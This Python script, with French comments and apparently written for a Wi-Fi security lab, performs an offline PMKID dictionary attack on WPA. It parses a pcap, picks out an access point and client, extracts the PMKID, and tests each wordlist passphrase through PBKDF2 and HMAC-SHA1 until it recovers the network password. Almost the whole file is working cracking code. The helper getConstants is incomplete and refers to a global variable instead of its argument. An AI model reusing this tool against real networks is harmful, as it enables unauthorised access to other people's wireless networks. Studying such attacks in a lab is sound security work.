#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    Permet de lire une passphrase à partir d’un fichier (wordlist) ainsi qu'une capture pcap 
    Dérive les clef et constantes
    Calcule le MIC et si il est egal alors retourne la bonne passphrase. 

"""

__author__      = "Florian Mülhauser, Robin Cuénoud"

from scapy.all import *
from scapy.contrib.wpa_eapol import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import os 


PMK_STRING = b"PMK Name"

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]



def getConstants(pcap):
    """
        Get the constant given a capture 
        return ANonce, SNonce, mic_to_test, APmac, Clientmac, ssid 
    """
    handshake = []
    # capture handshake and ssid name and mac of AP and Client
    for frame in wpa:
        # first get ssid name and mac
        # find beacon frame (type 0 (management) , subtype 8 (Beacon))
        if frame.type == 0 and frame.subtype == 8:  
            ssid = frame.info.decode("utf-8")
            APmac = a2b_hex(frame.addr2.replace(':',''))
        # find authentication frame (type 0 ,subtype 11 )
        if frame.type == 0 and frame.subtype == 11 and a2b_hex(frame.addr2.replace(':', '')) == APmac :
                # get client mac 
                Clientmac = a2b_hex(frame.addr1.replace(':', ''))  
        # 4-way handshake 
        # layer WPA_key give frame 1 and 3 and proto == 1 (protocol EAPOL) give frame 2 and 4
        if frame.haslayer(EAPOL) or frame.type == 0 and frame.subtype == 0 and frame.proto == 1:
            handshake.append(frame)

# PMKID is 16 octet 4 before the end of the frame            
def getPMKID(wpa,apmac, clientmac):
    for frame in wpa:
        if frame.haslayer(WPA_key) and frame.addr2 == apmac and frame.addr1 == clientmac:
            return raw(frame)[-20:-4]
    # if no handshake
    return None


                
def getHandshakeInfo(capture):
    ssid = []
    
    for frame in capture:
        if frame.haslayer(Dot11): 
            # only give ssid name that have handshake[0]
            if frame.type == 0 and frame.subtype == 0:
                ssid.append( (frame.info.decode('ascii'),frame.addr1,frame.addr2) )
    return ssid

def crack(pmkid, ssid, apmac, clientmac, passphrases):
    
    apmac = apmac.replace(':','')
    clientmac = clientmac.replace(':','')

    apmac = a2b_hex(apmac.replace(':', ''))
    clientmac = a2b_hex(clientmac.replace(':', ''))

    ssid = ssid.encode()
    for passphrase in passphrases:
        passphrase = passphrase.strip() 
        print("Testing passphrase : ", passphrase)
        # compute pmk
        pmk = pbkdf2(hashlib.sha1,passphrase.encode(), ssid, 4096, 32)
        
        computed_pmkid = hmac.new(pmk, PMK_STRING + apmac + clientmac, hashlib.sha1)

        
        if computed_pmkid.digest()[:16] == pmkid:
            return passphrase

    print("Dict attack on pmkid failed, probably passphrase is not in dict file")
    return None

if __name__ == "__main__":
    print("Reading pcap...")
    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    wpa=rdpcap("PMKID_handshake.pcap") 
    infos  = getHandshakeInfo(wpa)
    if len(infos) == 0:
        print("no handshake in capture exit..")
        exit()
    print("Availables ssid , apmac , clientmac : ")
    for (i, item) in enumerate(infos):
        print(i, item)

    print("Select by typing corresponding number ...")

    index = int(input())
    
    
    if index < 0 or index >= len(infos):
        print("Unvalid index.. exit ")
        exit()
    
    pmkid = getPMKID(wpa,infos[index][1],infos[index][2])
    
    # opening dictionnary
    passphrases = open('passphrases.txt').readlines()

    result = crack(pmkid,infos[index][0],infos[index][1],infos[index][2], passphrases)

    if result:
        print("Passphrase found annd it's .. ",result)





